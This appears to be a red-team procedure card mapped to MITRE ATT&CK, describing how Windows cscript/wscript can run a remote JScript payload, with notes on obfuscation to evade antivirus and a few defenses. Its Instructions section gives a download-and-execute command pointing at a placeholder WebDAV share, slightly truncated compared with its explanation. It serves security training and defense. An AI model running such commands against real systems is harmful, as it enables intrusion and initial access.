---
id: 591385a9-9323-40f3-88f8-073efd808767
name: Windows - Cscript / Wscript JScript Payload Execution
type: procedure
verified: false
submitted: false
created_at: '2023-04-06T03:56:26.835860+00:00'
updated_at: '2023-04-10T20:37:08.546571+00:00'
tactics:
- '[[Execution|TA0002 - Execution]]'
techniques:
- '[[User Execution|T1204 - User Execution]]'
sub_techniques:
- '[[Malicious File|T1204.002 - Malicious File]]'
tags:
- '[[Cscript / Wscript]]'
- '[[Windows - Download and execute methods]]'
---

# Windows - Cscript / Wscript JScript Payload Execution

## Summary

Cscript and Wscript are command-line tools for running scripts. In this case, JScript scripts can be executed to download and execute a payload from a remote server. The JScript code can be obfuscated to evade detection. This method is often used by attackers to gain a foothold in a target network 

## Description

# Description

Cscript and Wscript are command-line tools for running scripts. In this case, JScript scripts can be executed to download and execute a payload from a remote server. The JScript code can be obfuscated to evade detection. This method is often used by attackers to gain a foothold in a target network or to escalate privileges. 

Technical explanation: Cscript and Wscript are included in Windows as part of the Windows Script Host (WSH). JScript is a scripting language that is similar to JavaScript. By running a JScript script with Cscript or Wscript, an attacker can download and execute a payload from a remote server. The JScript code can be obfuscated to evade detection by antivirus software. 

Business value: This technique can be used by attackers to gain initial access to a target network. Once an attacker has a foothold in a network, they can move laterally to find valuable data or escalate privileges to gain further access to the network.

 

## Requirements

1. Access to a target system with Cscript or Wscript installed

1. A JScript payload hosted on a remote server

 

## Defense

1. Use antivirus software to detect and block malicious JScript code

1. Disable or restrict the use of Cscript and Wscript on systems where they are not needed

1. Monitor network traffic for suspicious connections to remote servers

 

## Objectives

1. Download and execute a payload on a target system

1. Gain initial access to a target network

 

# Instructions

1. To execute the JScript payload, run the following command in a PowerShell terminal:

 



**Code**: [[cscript //E:jscript \\webdavserver\folder\payload.]]



> This command will execute a JScript payload located at \\webdavserver\folder\payload.txt using the cscript command-line tool. The //E:jscript parameter specifies that the script should be executed using the JScript scripting engine. This command can be used to execute arbitrary code on a remote system and should only be used for authorized and legitimate purposes.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution|TA0002 - Execution]]

### Techniques

- [[User Execution|T1204 - User Execution]]

### Sub-Techniques

- [[Malicious File|T1204.002 - Malicious File]]

## Tags

- [[Cscript / Wscript]]
- [[Windows - Download and execute methods]]


